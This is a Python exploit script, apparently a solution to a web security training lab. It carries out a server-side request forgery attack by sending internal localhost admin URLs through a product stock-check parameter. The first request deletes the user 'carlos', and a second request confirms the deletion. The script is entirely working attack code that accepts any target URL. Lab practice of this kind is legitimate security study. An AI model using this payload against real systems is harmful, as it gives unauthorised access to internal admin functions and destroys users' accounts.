import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def is_delete_user_successful(url):
    delete_user_url_ssrf = (
        "http://localhost/admin/delete?username=carlos"
    )
    check_stock_path = "/product/stock"
    parameters = {"stockApi": delete_user_url_ssrf}
    response = requests.post(
        url + check_stock_path,
        data=parameters,
        verify=False,
        allow_redirects=False,
        proxies=proxies
    )
    return response.status_code == 302

def is_delete_user_check_successful(url):
    admin_ssrf_payload = "http://localhost/admin"
    check_stock_path = "/product/stock"
    parameters = {"stockApi":admin_ssrf_payload}
    response = requests.post(
        url + check_stock_path,
        data=parameters,
        verify=False,
        proxies=proxies
    )
    return (
        "User deleted successfully" 
        in response.text)

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        print("[+] Starting SSRF attack...")
        if not is_delete_user_successful(url):
            print("[-] Delete user was not successful.")
            sys.exit(FAIL)
        if not is_delete_user_check_successful(url):
            print("[-] Delete user check was not successful.")
            sys.exit(FAIL)
        print("[+] SSRF Attack was successful.")
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("[-] An exception occured %s" % exception)
        print("[-] The SSRF attack was not successful.")
        sys.exit(FAIL) 